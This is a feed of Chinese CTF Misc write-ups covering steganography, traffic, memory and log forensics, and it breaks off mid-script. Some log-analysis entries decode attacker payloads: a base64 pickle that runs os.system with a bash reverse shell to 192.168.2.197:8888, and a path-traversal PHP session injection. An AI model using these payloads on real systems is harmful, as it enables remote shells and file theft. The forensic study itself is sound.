         <content type="html"><![CDATA[<p>题目给的是一个pdf文件</p><p><img src="https://imag.keyblue.cn/imag/202308291322049.png" alt="image-20230829132242964"></p><p>010打开看不出来什么东西</p><p>应该是一个隐写</p><p>wbstego4open下载 ：<a href="http://wbstego.wbailer.com/">http://wbstego.wbailer.com/</a></p><p>用wbstego4open来查看隐写内容</p><p>打开软件选择Decode</p><p><img src="https://imag.keyblue.cn/imag/202308291729242.png" alt="image-20230829172914185"></p><p>选择PDF把需要查看的文件选上</p><p><img src="https://imag.keyblue.cn/imag/202308291730071.png" alt="image-20230829173010034"></p><p>这里空着</p><p><img src="https://imag.keyblue.cn/imag/202308291730875.png" alt="image-20230829173022840"></p><p>选择保存到哪里，这里选择保存到1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291730725.png" alt="image-20230829173049688"></p><p>完成</p><p><img src="https://imag.keyblue.cn/imag/202308291731142.png" alt="image-20230829173114105"></p><p>打开1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308291732803.png" alt="image-20230829173249779"></p><p>flag值：flag{verY_g00d_YoU_f0und_th1s}</p>]]></content>
       
@@ -613,11 +340,326 @@
     
     
     <entry>
+      <title>[LitCTF 2023]Take me hand (初级)</title>
+      <link href="/2023/08/29/%5BLitCTF%202023%5DTake%20me%20hand%20(%E5%88%9D%E7%BA%A7)/"/>
+      <url>/2023/08/29/%5BLitCTF%202023%5DTake%20me%20hand%20(%E5%88%9D%E7%BA%A7)/</url>
+      
+        <content type="html"><![CDATA[<p>打开流量包过滤http</p><p><img src="https://imag.keyblue.cn/imag/202308291318257.png" alt="image-20230829131841214"></p><p>点开其中一个请求包可以看到请求内容就是flag</p><p><img src="https://imag.keyblue.cn/imag/202308291319812.png" alt="image-20230829131929775"></p><p>LitCTF{Give_y0ur_hand_to_me!!!_plz}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[陇剑杯 2021]内存分析</title>
+      <link href="/2023/08/29/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/29/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E5%86%85%E5%AD%98%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>解开压缩包得到两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308291018351.png" alt="image-20230829101826317"></p><p>先看txt文本</p><p><img src="https://imag.keyblue.cn/imag/202308291018667.png" alt="image-20230829101857649"></p><p>使用volatility对文件进行分析</p><p>首先查看镜像信息</p><p><img src="https://imag.keyblue.cn/imag/202308291034248.png" alt="image-20230829103417211"></p><p>题目是需要知道虚拟机的密码，可以使用mimikatz查看或者lsadump</p><p><img src="https://imag.keyblue.cn/imag/202308291038639.png" alt="image-20230829103822601"></p><p>flag值：flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}</p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><p>先找找关键字ctf或者flag什么的，发现有HUAWEI</p><p><img src="https://imag.keyblue.cn/imag/202308291057514.png" alt="image-20230829105701484"></p><p>根据题意，flag在某品牌手机的备份文件里面，随机筛选HUAWEI关键词</p><p><img src="https://imag.keyblue.cn/imag/202308291057863.png" alt="image-20230829105749832"></p><p>将文件都下载下来</p><p><img src="https://imag.keyblue.cn/imag/202308291103074.png" alt="image-20230829110349048"></p><p>下载华为备份解密工具，</p><p>工具地址：<a href="https://github.com/RealityNet/kobackupdec">https://github.com/RealityNet/kobackupdec</a></p><p>使用命令解密 解密需要密码，密码根据提示是上一问的flag值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX &#x27;C:\Users\dell\Downloads\Compressed\kobackupdec-master\HUAWEI P40_2021-aa-bb xx.yy.zz&#x27; C:\Users\dell\Downloads\Compressed\kobackupdec-master\buk</span><br></pre></td></tr></table></figure><p>打开解密后的文件夹，发现一个压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308291220132.png" alt="image-20230829122055096"></p><p>使用7z打开</p><p><img src="https://imag.keyblue.cn/imag/202308291221941.png" alt="image-20230829122133917"></p><p>发现flag值flag{TH4NK Y0U FOR DECRYPTING MY DATA}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[鹤城杯 2021]流量分析</title>
-      <link href="/2023/09/01/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
-      <url>/2023/09/01/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
+      <link href="/2023/08/28/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/28/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
       
         <content type="html"><![CDATA[<p>题目打开，是个pacpng包</p><p><img src="https://imag.keyblue.cn/imag/202308281806840.png" alt="image-20230828180613752"></p><p>明显的sql注入流量</p><p>筛选流量</p><p><img src="https://imag.keyblue.cn/imag/202308281821128.png" alt="image-20230828182101087"></p><p>选择导出为纯文本</p><p><img src="https://imag.keyblue.cn/imag/202308281825573.png" alt="image-20230828182552538"></p><p>取消勾选Packet details后导出</p><p><img src="https://imag.keyblue.cn/imag/202308281936860.png" alt="image-20230828193622826"></p><p>导出后的文件</p><p><img src="https://imag.keyblue.cn/imag/202308281937902.png" alt="image-20230828193727851"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">var_back = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res/timu.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">&#x27;(text/html)&#x27;</span>, line):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">f&quot;[%20and%20ascii(substr((select%20flag%20from%20t),]&quot;</span>, line):</span><br><span class="line">            var = <span class="built_in">int</span>(re.findall(<span class="string">f&quot;[,1))]=(.*?)--+&quot;</span>, line)[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> var &lt;= var_back:</span><br><span class="line">                flag += <span class="built_in">str</span>(var_back) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">            var_back = var</span><br></pre></td></tr></table></figure><p>得到flag值为：flag{w1reshARK_ez_1sntit}~~~~</p><p><img src="https://imag.keyblue.cn/imag/202308282038873.png" alt="image-20230828203829847"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[NISACTF 2022]bqt</title>
+      <link href="/2023/08/28/%5BNISACTF%202022%5Dbqt/"/>
+      <url>/2023/08/28/%5BNISACTF%202022%5Dbqt/</url>
+      
+        <content type="html"><![CDATA[<p>先拉到kali里查看文件类型</p><p><img src="https://imag.keyblue.cn/imag/202308281614423.png" alt="image-20230828161452394"></p><p>是一个pdf文件</p><p>binwalk分离无果</p><p>使用010打开文件，没有发现有用的信息</p><p>最后打开pdf文件查看，使用ctrl+A全选，发现文档中间有内容，复制查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c8e9aca0c3f4e6e5f2a1a0d4e8e5a0e6ece1e7a0e9f3baa0e6ece1e7fbf7e5e6e5efe9e4eae7efe5e4f3e6e9eff2f0e5e6e4e6e7e7e6e4f3e5fd</span><br></pre></td></tr></table></figure><p>每间隔两个字符加个空格</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c8 e9 ac a0 c3 f4 e6 e5 f2 a1 a0 d4 e8 e5 a0 e6 ec e1 e7 a0 e9 f3 ba a0 e6 ec e1 e7 fb f7 e5 e6 e5 ef e9 e4 ea e7 ef e5 e4 f3 e6 e9 ef f2 f0 e5 e6 e4 e6 e7 e7 e6 e4 f3 e5 fd</span><br></pre></td></tr></table></figure><p>转换成10进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">200 233 172 160 195 244 230 229 242 161 160 212 232 229 160 230 236 225 231 160 233 243 186 160 230 236 225 231 251 247 229 230 229 239 233 228 234 231 239 229 228 243 230 233 239 242 240 229 230 228 230 231 231 230 228 243 229 253</span><br></pre></td></tr></table></figure><p>因为flag一般最后一个字符是}</p><p>}字符的ASCII码序号是125</p><p>253-125&#x3D;128，可以每个字符减128试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">72 105 44 32 67 116 102 101 114 33 32 84 104 101 32 102 108 97 103 32 105 115 58 32 102 108 97 103 123 119 101 102 101 111 105 100 106 103 111 101 100 115 102 105 111 114 112 101 102 100 102 103 103 102 100 115 101 125</span><br></pre></td></tr></table></figure><p>ascll解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi, Ctfer! The flag is: flag&#123;wefeoidjgoedsfiorpefdfggfdse&#125;</span><br></pre></td></tr></table></figure><p>恶心~</p><p>一般flag都是用}结尾的  }的ascii十进制值为125</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[LitCTF 2023]这羽毛球怎么只有一半啊（恼 (初级)</title>
+      <link href="/2023/08/28/%5BLitCTF%202023%5D%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%EF%BC%88%E6%81%BC%20(%E5%88%9D%E7%BA%A7)/"/>
+      <url>/2023/08/28/%5BLitCTF%202023%5D%E8%BF%99%E7%BE%BD%E6%AF%9B%E7%90%83%E6%80%8E%E4%B9%88%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8D%8A%E5%95%8A%EF%BC%88%E6%81%BC%20(%E5%88%9D%E7%BA%A7)/</url>
+      
+        <content type="html"><![CDATA[<p>图片只有一半</p><p><img src="https://imag.keyblue.cn/imag/202308281057421.png" alt="image-20230828105727274"></p><p>应该是要爆破图片宽高</p><p>010直接更改图片高度，保存打开图片可以看到完整图片了</p><p><img src="https://imag.keyblue.cn/imag/202308281152722.png" alt="image-20230828115241690"></p><p><img src="https://imag.keyblue.cn/imag/202308281154576.png" alt="image-20230828115419501"></p><p><img src="https://imag.keyblue.cn/imag/202308281154939.png" alt="image-20230828115441917"></p><p>LitCTF{Fl4g_0fcourse!}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[LitCTF 2023]404notfound (初级)</title>
+      <link href="/2023/08/28/%5BLitCTF%202023%5D404notfound%20(%E5%88%9D%E7%BA%A7)/"/>
+      <url>/2023/08/28/%5BLitCTF%202023%5D404notfound%20(%E5%88%9D%E7%BA%A7)/</url>
+      
+        <content type="html"><![CDATA[<p>解压之后是一个图片</p><p><img src="https://imag.keyblue.cn/imag/202308281011008.png" alt="image-20230828101118969"></p><p>binwalk分离无果</p><p>用010打开图片，拉到最后，没有发现有用的信息</p><p>在kali里使用strings命令查看</p><p><img src="https://imag.keyblue.cn/imag/202308281022205.png" alt="image-20230828102243162"></p><p>发现flag值：LitCTF{Its_404_but_1ts_n0t_a_page}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[NISACTF 2022]huaji</title>
+      <link href="/2023/08/28/%5BNISACTF%202022%5Dhuaji/"/>
+      <url>/2023/08/28/%5BNISACTF%202022%5Dhuaji/</url>
+      
+        <content type="html"><![CDATA[<p>使用binwalk进行分离</p><p><img src="https://imag.keyblue.cn/imag/202308271206557.png" alt="image-20230827120618515"></p><p>得到的压缩包需要密码解压</p><p><img src="https://imag.keyblue.cn/imag/202308271208655.png" alt="image-20230827120802621"></p><p>找不到密码，在原图片上看看，发现huaji？的属性里有一串奇怪的字符<code>6374665f4e4953415f32303232</code></p><p><img src="https://imag.keyblue.cn/imag/202308271216203.png" alt="image-20230827121638167"></p><p>对其进行ascll解码得到<code>ctf_NISA_2022</code></p><p><img src="https://imag.keyblue.cn/imag/202308271218072.png" alt="image-20230827121857045"></p><p>使用解码字符对压缩包解压缩，得到flag值<code>flag&#123;Nls@_FumYEnnOjy&#125;</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2020]找找吧</title>
+      <link href="/2023/08/28/%5BSWPU%202020%5D%E6%89%BE%E6%89%BE%E5%90%A7/"/>
+      <url>/2023/08/28/%5BSWPU%202020%5D%E6%89%BE%E6%89%BE%E5%90%A7/</url>
+      
+        <content type="html"><![CDATA[<p>题目的附件需要解压密码</p><p><img src="https://imag.keyblue.cn/imag/202308280843443.png" alt="image-20230828084348396"></p><p>使用binwalk分离无果</p><p>使用foremost分离无果</p><p>使用010打开附件，直接拉到最后，发现了key</p><p><img src="https://imag.keyblue.cn/imag/202308280851443.png" alt="image-20230828085125413"></p><p>压缩包内有一个mp3文件和一个压缩包，mp3文件使用Audacity打开，在音频的最后发现了像摩斯密码的内容</p><p><img src="https://imag.keyblue.cn/imag/202308280856684.png" alt="image-20230828085623626"></p><p><img src="https://imag.keyblue.cn/imag/202308280857191.png" alt="image-20230828085729160"></p><p>记录得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.. ....- ...-- ----. -.... ...-- . ----. ..--- -... ----- .---- ..--- .- .- -...</span><br></pre></td></tr></table></figure><p>解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d43963e92b012aab</span><br></pre></td></tr></table></figure><p>用此字符串做压缩包密码，显示密码错误。</p><p>猜测可能是md5值，随机在线解密。得到明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1ce_try</span><br></pre></td></tr></table></figure><p>在线解密网站：<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="https://imag.keyblue.cn/imag/202308280908162.png" alt="image-20230828090823133"></p><p>解压缩得到两张图片</p><p><img src="https://imag.keyblue.cn/imag/202308280913593.png" alt="image-20230828091328566"></p><p>将gif图片使用movgear-gif打开，看到某一帧带有一串字符</p><p><img src="https://imag.keyblue.cn/imag/202308280917493.png" alt="image-20230828091736418"></p><p>识别到flag值</p><p><img src="https://imag.keyblue.cn/imag/202308280918288.png" alt="image-20230828091825248"></p><p>随即提交但是错误</p><p>似乎是凯撒密码，批量解密</p><p><img src="https://imag.keyblue.cn/imag/202308280955841.png" alt="image-20230828095511800"></p><p>得到flag值：sWpu_N1c3_Try</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2019]漂流记的马里奥</title>
+      <link href="/2023/08/27/%5BSWPU%202019%5D%E6%BC%82%E6%B5%81%E8%AE%B0%E7%9A%84%E9%A9%AC%E9%87%8C%E5%A5%A5/"/>
+      <url>/2023/08/27/%5BSWPU%202019%5D%E6%BC%82%E6%B5%81%E8%AE%B0%E7%9A%84%E9%A9%AC%E9%87%8C%E5%A5%A5/</url>
+      
+        <content type="html"><![CDATA[<p>题目给的是一个exe文件，双击运行会创建1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271956089.png" alt="image-20230827195658049"></p><p><img src="https://imag.keyblue.cn/imag/202308271957280.png" alt="image-20230827195710245"></p><p>使用010打开文件，发现末尾是个rar压缩包以及ntfs和flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271959190.png" alt="image-20230827195901155"></p><p>在cmd中使用<code>dir /r</code>命令可以发现<code> 1.txt:flag.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308272104590.png" alt="image-20230827210410554"></p><p>最后使用<code>notepad 1.txt:flag.txt</code>可以查看隐藏的内容</p><p><img src="https://imag.keyblue.cn/imag/202308272105464.png" alt="image-20230827210502434"></p><p>得到flag值swupctf{ddg_is_cute}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[NISACTF 2022]为什么我什么都看不见</title>
+      <link href="/2023/08/27/%5BNISACTF%202022%5D%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%80%E4%B9%88%E9%83%BD%E7%9C%8B%E4%B8%8D%E8%A7%81/"/>
+      <url>/2023/08/27/%5BNISACTF%202022%5D%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%80%E4%B9%88%E9%83%BD%E7%9C%8B%E4%B8%8D%E8%A7%81/</url>
+      
+        <content type="html"><![CDATA[<p>使用010打开文件，破损的PNG文件头，补好</p><p><img src="https://imag.keyblue.cn/imag/202308271735376.png" alt="image-20230827173547339"></p><p>然后给文件加上后缀</p><p>在kali使用zsteg查看隐写</p><p><img src="https://imag.keyblue.cn/imag/202308271737376.png" alt="image-20230827173729331"></p><p>得到flag值NISA{Wlec0me_to_NiSa2022}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPUCTF 2021 新生赛]gif好像有点大</title>
+      <link href="/2023/08/27/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dgif%E5%A5%BD%E5%83%8F%E6%9C%89%E7%82%B9%E5%A4%A7/"/>
+      <url>/2023/08/27/%5BSWPUCTF%202021%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dgif%E5%A5%BD%E5%83%8F%E6%9C%89%E7%82%B9%E5%A4%A7/</url>
+      
+        <content type="html"><![CDATA[<p>使用foremost和binwalk分离文件无果</p><p>010打开文件也没有发现什么有用的信息</p><p>随即使用Stegsolve.jar打开gif，选择frame browser模式</p><p><img src="https://imag.keyblue.cn/imag/202308271701553.png" alt="image-20230827170114514"></p><p>一个一共800多帧，在562帧发现一个二维码</p><p><img src="https://imag.keyblue.cn/imag/202308271704355.png" alt="image-20230827170409299"></p><p>使用微信或者<code>QR Research</code>扫码</p><p><img src="https://imag.keyblue.cn/imag/202308271703623.png" alt="image-20230827170317585"></p><p>得到flag值为NSS{The_G1F_ls_T00_b1g}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[陇剑杯 2021]简单日志分析</title>
+      <link href="/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>简单分析可知参数为<code>user</code></p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [07/Aug/2021 10:43:12] &quot;GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1&quot; 500 -</span><br><span class="line"></span><br><span class="line">解密得到</span><br><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;cat /Th4s_IS_VERY_Import_Fi1e&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>所以黑客查看秘密文件的绝对路径为<code>/Th4s_IS_VERY_Import_Fi1e</code></p><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [07/Aug/2021 10:43:12] &quot;GET /?user=STAKcDAKMFMnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjIuMTk3Lzg4ODggMD4mMScKcDEKMChnMApscDIKMChJMAp0cDMKMChnMwpJMApkcDQKMGNvcwpzeXN0ZW0KcDUKMGc1CihnMQp0Ui4= HTTP/1.1&quot; 500 -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>所以黑客反弹shell的ip和端口为192.168.2.197:8888</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[陇剑杯 2021]日志分析</title>
+      <link href="/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
+      <url>/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5D%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>根据日志文件发现响应码200极少，随机筛选含200的行。</p><p>发现了泄露的<a href="http://www.zip文件/">www.zip文件</a></p><p><img src="https://imag.keyblue.cn/imag/202308271557455.png" alt="image-20230827155715439"></p><h1 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h1><p>查看日志，在最后发现了&#x2F;?filename&#x3D;的语句，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure><p>所以文件名为sess_car</p><h1 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D</span><br><span class="line"></span><br><span class="line">解码得到</span><br><span class="line">../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure><p>可以看到使用的是SplFileObject类读取的flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[陇剑杯 2021]SQL注入</title>
+      <link href="/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5DSQL%E6%B3%A8%E5%85%A5/"/>
+      <url>/2023/08/27/%5B%E9%99%87%E5%89%91%E6%9D%AF%202021%5DSQL%E6%B3%A8%E5%85%A5/</url>
+      
+        <content type="html"><![CDATA[<h2 id="问1"><a href="#问1" class="headerlink" title="问1"></a>问1</h2><p>明显的布尔盲注</p><h2 id="问2"><a href="#问2" class="headerlink" title="问2"></a>问2</h2><p>拉到日志最后</p><p><img src="https://imag.keyblue.cn/imag/202308271453488.png" alt="image-20230827145327453"></p><p>看到字段为flag，数据库为sqli，表为flag</p><h2 id="问3"><a href="#问3" class="headerlink" title="问3"></a>问3</h2><p>观察发现匹配到正确的字符时，响应的页面字符大小为<code>479|480|481|482</code>根据这个特征有此脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">with open(&#x27;res/access.log&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    for line in f:</span><br><span class="line">        if 